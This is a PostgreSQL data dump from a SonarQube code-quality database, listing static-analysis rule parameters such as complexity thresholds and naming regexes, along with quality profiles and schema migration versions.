INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (32, 124, 'reportLevel', 'Cyclomatic Complexity reporting threshold', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (33, 124, 'showClassesComplexity', 'Add class average violations to the report', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (34, 125, 'allowCommentedBlocks', 'Empty blocks containing comments will be skipped. Default is false.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (35, 133, 'minimum', 'The type NCSS count reporting threshold. Default is 1500.', 'INTEGER', '1500');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (36, 138, 'problemDepth', 'The if statement depth reporting threshold. Default is 3.', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (37, 156, 'checkNonStaticFields', 'Do not set this to true and checkNonStaticMethods to false. Default is false.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (38, 156, 'checkNonStaticMethods', 'Do not set this to false and checkNonStaticFields to true. Default is true.', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (39, 160, 'minimum', 'The method size reporting threshold. Default is 100.', 'INTEGER', '100');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (40, 162, 'threshold', 'The report threshold. Default is 1.', 'INTEGER', '1');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (41, 164, 'violationSuppressRegex', 'Suppress violations with messages matching a regular expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (42, 164, 'violationSuppressXPath', 'Suppress violations on nodes which match a given relative XPath expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (43, 168, 'violationSuppressRegex', 'Suppress violations with messages matching a regular expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (44, 168, 'violationSuppressXPath', 'Suppress violations on nodes which match a given relative XPath expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (45, 175, 'IgnoreJUnitCompletely', 'If true, all methods in a JUnit testcase may throw Exception', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (46, 176, 'strict', 'Also flag classes, that are named Abstract, but are not abstract', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (47, 181, 'minimum', 'Number of characters that are required as a minimum for a class name.', 'INTEGER', '5');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (48, 184, 'minimum', 'Number of characters that are required as a minimum for a variable name', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (49, 190, 'ignoreEnumDeclarations', 'Ignore Enum Declarations that precede fields.', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (50, 190, 'ignoreAnonymousClassDeclarations', 'Ignore Field Declarations, that are initialized with anonymous class declarations', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (51, 213, 'maxmethods', 'The method count reporting threshold. Default is 10.', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (52, 225, 'threshold', 'The unique type reporting threshold. Default is 20.', 'INTEGER', '20');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (53, 226, 'minimum', 'The parameter count reporting threshold. Default is 10.', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (54, 229, 'minimum', 'The variable length reporting threshold. Default is 17.', 'INTEGER', '17');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (55, 239, 'maxfields', 'The field count reporting threshold. Default is 15.', 'INTEGER', '15');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (56, 245, 'minimum', 'The method NCSS count reporting threshold. Default is 100.', 'INTEGER', '100');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (57, 246, 'checkParameterizedMethods', 'Check parameterized methods. Default is false.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (58, 248, 'showMethodsComplexity', 'Indicate if method average violation should be added to the report. Default is true.', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (59, 248, 'reportLevel', 'The Cyclomatic Complexity reporting threshold. Default is 10.', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (60, 248, 'showClassesComplexity', 'Indicate if class average violation should be added to the report. Default is true.', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (61, 249, 'minimumNumberCaseForASwitch', 'Minimum number of branches for a switch. Default is 3.', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (62, 252, 'showMethodsComplexity', 'Add method average violations to the report', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (63, 252, 'reportLevel', 'Cyclomatic Complexity reporting threshold', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (64, 252, 'showClassesComplexity', 'Add class average violations to the report', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (65, 267, 'ignoreExplicitConstructorInvocation', 'Ignore explicit constructor invocation when deciding whether constructor is empty or not. Default is false.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (66, 269, 'violationSuppressXPath', 'Suppress violations on nodes which match a given relative XPath expression.', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (67, 272, 'xpath', 'XPath expressions.', 'TEXT', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (68, 272, 'message', 'Message to display when a violation occurs.', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (69, 273, 'maxDuplicateLiterals', 'Max duplicate literals', 'INTEGER', '4');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (70, 273, 'skipAnnotations', 'Skip literals within Annotations. Default is false.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (71, 273, 'minimumLength', 'Minimum string length to check', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (72, 273, 'exceptionList', 'Strings in that list are skipped.', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (73, 273, 'exceptionfile', 'File containing strings to skip (one string per line), only used if exceptionlist is not set.', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (74, 273, 'separator', 'Separator used in the exceptionlist. Default is ,', 'STRING', ',');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (75, 285, 'maximumStaticImports', 'All static imports can be disallowed by setting this to 0. Default is 4.', 'INTEGER', '4');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (76, 292, 'types', 'Resources to check. Default value is ''Connection,Statement,ResultSet'',', 'STRING', 'Connection,Statement,ResultSet');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (77, 292, 'closeTargets', 'Methods which may close this resource. Default is ''close''.', 'STRING', 'close');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (78, 293, 'minimum', 'The public item reporting threshold. Default is 45.', 'INTEGER', '45');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (79, 319, 'max', 'Maximum allowed control flow statement nesting depth', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (80, 345, 'max', 'Maximum number of allowed conditional operators in an expression', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (81, 379, 'format', 'Regular expression used to check the method names against', 'STRING', '^[A-Z][a-zA-Z0-9_]*[a-zA-Z0-9]$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (82, 381, 'format', 'Regular expression used to check the class names against.', 'STRING', '^([A-HJ-Z][a-zA-Z0-9]+|I[a-z0-9][a-zA-Z0-9]*|[A-Z][a-zA-Z0-9]+Extensions)$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (83, 394, 'maximum', 'Maximum number of case', 'INTEGER', '30');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (84, 421, 'maximumFunctionComplexityThreshold', 'The maximum authorized complexity in function', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (85, 433, 'max', 'Maximum authorized number of parameters', 'INTEGER', '7');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (86, 434, 'maximumFileLocThreshold', 'Maximum authorized lines in a file.', 'INTEGER', '1000');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (87, 436, 'maximumLineLength', 'The maximum authorized line length.', 'INTEGER', '200');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (88, 556, 'CheckId', NULL, 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (89, 687, 'excludedResourceTypes', 'Comma separated list of the excluded resource types, using fully qualified names (example: "org.apache.hadoop.fs.FileSystem")', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (90, 702, 'format', 'Regular expression used to check the constant names against.', 'STRING', '^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (91, 704, 'legalTrailingCommentPattern', 'Description Pattern for text of trailing comments that are allowed. By default, comments containing only one word.', 'STRING', '^\s*+[^\s]++$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (92, 721, 'Exclude', 'Comma separated list of Sun packages to be ignored by this rule. Example: com.sun.jna,sun.misc', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (93, 722, 'threshold', 'Number of times a literal must be duplicated to trigger an issue', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (94, 727, 'threshold', 'Maximum allowed number of ``<forward/>`` mappings in an ``<action>``', 'INTEGER', '4');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (95, 744, 'className', 'Name of the class whose constructor is forbidden. This parameter is mandatory, if absent the rule is disabled.', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (96, 744, 'argumentTypes', 'Comma-delimited list of argument types, E.G. java.lang.String, int[], int', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (97, 744, 'allOverloads', 'Set to true to flag all overloads regardless of parameter type', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (98, 754, 'Authorized numbers', 'Comma separated list of authorized numbers. Example: -1,0,1,2', 'STRING', '-1,0,1');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (99, 759, 'threshold', 'The maximum number of static imports allowed', 'INTEGER', '4');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (100, 774, 'max', 'Maximum authorized lines in a method', 'INTEGER', '75');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (101, 784, 'Threshold', 'The maximum authorized complexity.', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (102, 785, 'regularExpression', 'The regular expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (103, 785, 'message', 'The issue message', 'STRING', 'The regular expression matches this comment.');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (104, 790, 'max', 'Maximum allowed control flow statement nesting depth.', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (105, 814, 'countNonpublicFields', 'Whether or not to include non-public fields in the count', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (106, 814, 'maximumFieldThreshold', 'The maximum number of fields', 'INTEGER', '20');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (107, 824, 'countNonpublicMethods', 'Whether or not to include non-public methods in the count.', 'BOOLEAN', 'true');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (108, 824, 'maximumMethodThreshold', 'The maximum number of methods authorized in a class.', 'INTEGER', '35');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (109, 828, 'indentationLevel', 'Number of white-spaces of an indent.', 'INTEGER', '2');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (110, 830, 'max', 'Maximum number of classes a single class is allowed to depend upon', 'INTEGER', '20');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (111, 837, 'max', 'Maximum depth of the inheritance tree. (Number)', 'INTEGER', '5');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (112, 837, 'filteredClasses', 'Classes to be filtered out of the count of inheritance. Ex : java.fwk.AbstractFwkClass, java.fwkPackage.*', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (113, 844, 'format', 'Regular expression used to check the logger names against.', 'STRING', 'LOG(?:GER)?');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (114, 848, 'fromClasses', 'Optional. If this property is not defined, all classes should adhere to this constraint. Ex : **.web.**', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (115, 848, 'toClasses', 'Mandatory. Ex : java.util.Vector, java.util.Hashtable, java.util.Enumeration', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (116, 872, 'headerFormat', 'Expected copyright and license header', 'TEXT', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (117, 872, 'isRegularExpression', 'Whether the headerFormat is a regular expression', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (118, 895, 'Max', 'The maximum number of lines allowed', 'INTEGER', '25');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (119, 913, 'listOfWarnings', 'Comma separated list of warnings that can be suppressed (example: unchecked, cast, boxing). An empty list means that no warning can be suppressed.', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (120, 932, 'checkOnlyLong', 'Set to "true" to ignore "float" and "double" declarations.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (121, 935, 'methodName', 'Name of the forbidden method', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (122, 935, 'className', 'Name of the class whose method is forbidden', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (123, 935, 'argumentTypes', 'Comma-delimited list of argument types, E.G. java.lang.String, int[], int', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (124, 935, 'allOverloads', 'Set to true to flag all overloads regardless of parameter type', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (125, 940, 'exceptions', 'List of exceptions which should not be checked', 'STRING', 'java.lang.InterruptedException, java.lang.NumberFormatException, java.lang.NoSuchMethodException, java.text.ParseException, java.net.MalformedURLException, java.time.format.DateTimeParseException');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (126, 949, 'format', 'Regular expression used to check the class names against.', 'STRING', '^[A-Z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (127, 950, 'format', 'Regular expression used to check the method names against.', 'STRING', '^[a-z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (128, 952, 'max', 'Maximum number of lines', 'INTEGER', '5');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (129, 959, 'format', 'Regular expression against which test class names are checked.', 'STRING', '^((Test|IT)[a-zA-Z0-9]+|[A-Z][a-zA-Z0-9]*(Test|IT|TestCase|ITCase))$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (130, 965, 'format', 'Regular expression the test method names are checked against.', 'STRING', '^test[A-Z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (131, 973, 'format', 'Regular expression used to check the field names against.', 'STRING', '^[a-z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (132, 974, 'forClasses', 'Pattern of classes which should adhere to this constraint. Ex : **.api.**', 'STRING', '**.api.**');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (133, 974, 'exclusion', 'Pattern of classes which are excluded from adhering to this constraint.', 'STRING', '**.internal.**');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (134, 986, 'max', 'Maximum number of allowed conditional operators in an expression', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (135, 987, 'Max', 'Maximum allowed lines in an anonymous class/lambda', 'INTEGER', '20');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (136, 1000, 'max', 'Maximum complexity allowed.', 'INTEGER', '200');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (137, 1022, 'regex', 'The regular expression the "artifactId" should match', 'STRING', '[a-z][a-z-0-9]+');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (138, 1030, 'factoryMethod', 'the fully-qualified name of a factory method that returns an open resource, with or without a parameter list. E.G. "org.assoc.res.ResourceFactory$Innerclass#create" or "org.assoc.res.SpecialResourceFactory#create(java.lang.String, int)"', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (139, 1030, 'closingMethod', 'the fully-qualified name of the method which closes the open resource, with or without a parameter list. E.G. "org.assoc.res.MyResource#closeMe" or "org.assoc.res.MySpecialResource#closeMe(java.lang.String, int)"', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (140, 1030, 'constructor', 'the fully-qualified name of a constructor that creates an open resource. An optional signature may be specified after the class name. E.G. "org.assoc.res.MyResource" or "org.assoc.res.MySpecialResource(java.lang.String, int)"', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (141, 1030, 'openingMethod', 'the fully-qualified name of a method that opens an existing resource, with or without a parameter list. E.G. "org.assoc.res.ResourceFactory#create" or "org.assoc.res.SpecialResourceFactory #create(java.lang.String, int)"', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (142, 1037, 'maximum', 'Maximum number of case', 'INTEGER', '30');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (143, 1044, 'dependencyName', 'Pattern describing forbidden dependencies group and artifact ids. E.G. ''``*:.*log4j``'' or ''``x.y:*``''', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (144, 1044, 'version', 'Dependency version pattern or dash-delimited range. Leave blank for all versions. E.G. ''``1.3.*``'', ''``1.0-3.1``'', ''``1.0-*``'' or ''``*-3.1``''', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (145, 1046, 'regex', 'The regular expression the "groupId" should match', 'STRING', '(com|org)(\.[a-z][a-z-0-9]*)+');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (146, 1061, 'Threshold', 'The maximum authorized complexity.', 'INTEGER', '15');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (147, 1067, 'max', 'Maximum authorized number of parameters', 'INTEGER', '7');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (148, 1067, 'constructorMax', 'Maximum authorized number of parameters for a constructor', 'INTEGER', '7');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (149, 1071, 'max', 'Maximum allowed return statements per method', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (150, 1079, 'maximumLineLength', 'The maximum authorized line length.', 'INTEGER', '120');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (151, 1086, 'Max', 'Maximum authorized lines in a file.', 'INTEGER', '750');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (152, 1089, 'className', 'Fully qualified name of the forbidden class. Use a regex to forbid a package.', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (153, 1091, 'format', 'Regular expression used to check the package names against.', 'STRING', '^[a-z]+(\.[a-z][a-z0-9]*)*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (154, 1098, 'format', 'Regular expression used to check the abstract class names against.', 'STRING', '^Abstract[A-Z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (155, 1100, 'format', 'Regular expression used to check the names against.', 'STRING', '^[a-z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (156, 1104, 'format', 'Regular expression used to check the type parameter names against.', 'STRING', '^[A-Z][0-9]?$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (157, 1107, 'format', 'Regular expression used to check the interface names against.', 'STRING', '^[A-Z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (158, 1111, 'format', 'Regular expression used to check the field names against.', 'STRING', '^[a-z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (159, 1115, 'format', 'Regular expression used to check the constant names against.', 'STRING', '^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (160, 1118, 'minimumBranchCoverageRatio', NULL, 'FLOAT', '65');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (161, 1119, 'minimumLineCoverageRatio', NULL, 'FLOAT', '65');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (162, 1120, 'minimumCommentDensity', NULL, 'FLOAT', '25');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (163, 1125, 'max', 'Maximum authorized lines in a function', 'INTEGER', '100');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (164, 1130, 'maximumNestingLevel', 'Maximum allowed "if/for/while/switch/try" statements nesting depth', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (165, 1147, 'regularExpression', 'The regular expression', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (166, 1147, 'message', 'The issue message', 'STRING', 'The regular expression matches this comment.');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (167, 1149, 'maximumFunctionComplexityThreshold', 'The maximum authorized complexity in function', 'INTEGER', '10');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (168, 1154, 'legalCommentPattern', 'Pattern for text of trailing comments that are allowed.', 'STRING', '^//\s*+[^\s]++$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (169, 1156, 'threshold', 'Number of allowed repetition before triggering an issue', 'INTEGER', '2');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (170, 1162, 'format', 'Regular expression used to check the variable names against', 'STRING', '^\$[a-z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (171, 1171, 'max', 'Maximum number of allowed conditional operators in an expression', 'INTEGER', '3');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (172, 1174, 'maximumFunctionParameters', 'The maximum authorized number of parameters', 'INTEGER', '7');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (173, 1176, 'body_braces', 'True to require curly braces around function body. False to forbid them for single-return bodies.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (174, 1176, 'parameter_parens', 'True to require parentheses around parameters. False to forbid them for single parameter.', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (175, 1198, 'headerFormat', 'Expected copyright and license header (plain text)', 'TEXT', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (176, 1207, 'format', 'Regular expression used to check the function names against.', 'STRING', '^[a-z][a-zA-Z0-9]*$');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (177, 1213, 'domainsToIgnore', 'Comma-delimited list of domains to ignore. Regexes may be used, e.g. (.*\.)?example.com,foo.org', 'STRING', NULL);
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (178, 1236, 'considerJSDoc', 'Consider only functions with @constructor tag as constructor functions', 'BOOLEAN', 'false');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (179, 1245, 'maximum', 'Maximum authorized lines in a file.', 'INTEGER', '1000');
INSERT INTO rules_parameters (id, rule_id, name, description, param_type, default_value) VALUES (180, 1252, 'maximumLineLength', 'The maximum authorized line length.', 'INTEGER', '80');


--
-- Data for Name: rules_profiles; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO rules_profiles (id, name, language, kee, parent_kee, rules_updated_at, created_at, updated_at, is_default) VALUES (1, 'Sonar way', 'cs', 'cs-sonar-way-07093', NULL, '2017-11-16T07:37:02+0000', '2017-11-16 07:37:01.807', '2017-11-16 07:37:02.48', true);
INSERT INTO rules_profiles (id, name, language, kee, parent_kee, rules_updated_at, created_at, updated_at, is_default) VALUES (2, 'Sonar way', 'java', 'java-sonar-way-87983', NULL, '2017-11-16T07:37:03+0000', '2017-11-16 07:37:02.485', '2017-11-21 01:00:36.471', false);
INSERT INTO rules_profiles (id, name, language, kee, parent_kee, rules_updated_at, created_at, updated_at, is_default) VALUES (6, 'Egov-QualityProfile', 'java', 'java-egov-qualityprofile-20090', NULL, '2017-11-16T07:46:00+0000', '2017-11-16 07:45:57.946', '2017-11-21 04:10:00.815', false);
INSERT INTO rules_profiles (id, name, language, kee, parent_kee, rules_updated_at, created_at, updated_at, is_default) VALUES (4, 'Sonar Security Way', 'js', 'js-sonar-security-way-17928', NULL, '2017-11-16T07:37:04+0000', '2017-11-16 07:37:04.347', '2017-11-16 07:37:04.554', false);
INSERT INTO rules_profiles (id, name, language, kee, parent_kee, rules_updated_at, created_at, updated_at, is_default) VALUES (3, 'Sonar way', 'js', 'js-sonar-way-87564', NULL, '2017-11-16T07:37:04+0000', '2017-11-16 07:37:03.994', '2017-11-16 07:37:04.56', true);
INSERT INTO rules_profiles (id, name, language, kee, parent_kee, rules_updated_at, created_at, updated_at, is_default) VALUES (34, 'Default^Default-QualityProfile', 'java', 'java-default-egov-qualityprofile-97054', NULL, '2017-11-21T04:09:55+0000', '2017-11-21 04:09:52.831', '2017-11-21 04:11:56.206', true);


--
-- Data for Name: schema_migrations; Type: TABLE DATA; Schema: public; Owner: sonar
--

INSERT INTO schema_migrations (version) VALUES ('1');
INSERT INTO schema_migrations (version) VALUES ('2');
INSERT INTO schema_migrations (version) VALUES ('10');
INSERT INTO schema_migrations (version) VALUES ('11');
INSERT INTO schema_migrations (version) VALUES ('14');
INSERT INTO schema_migrations (version) VALUES ('35');
INSERT INTO schema_migrations (version) VALUES ('53');
INSERT INTO schema_migrations (version) VALUES ('59');
INSERT INTO schema_migrations (version) VALUES ('61');
INSERT INTO schema_migrations (version) VALUES ('62');
INSERT INTO schema_migrations (version) VALUES ('79');
INSERT INTO schema_migrations (version) VALUES ('80');
INSERT INTO schema_migrations (version) VALUES ('86');
INSERT INTO schema_migrations (version) VALUES ('87');
INSERT INTO schema_migrations (version) VALUES ('88');
INSERT INTO schema_migrations (version) VALUES ('93');
INSERT INTO schema_migrations (version) VALUES ('95');
INSERT INTO schema_migrations (version) VALUES ('131');
INSERT INTO schema_migrations (version) VALUES ('140');
INSERT INTO schema_migrations (version) VALUES ('151');
INSERT INTO schema_migrations (version) VALUES ('163');
INSERT INTO schema_migrations (version) VALUES ('169');
INSERT INTO schema_migrations (version) VALUES ('200');
INSERT INTO schema_migrations (version) VALUES ('202');
INSERT INTO schema_migrations (version) VALUES ('211');
INSERT INTO schema_migrations (version) VALUES ('215');
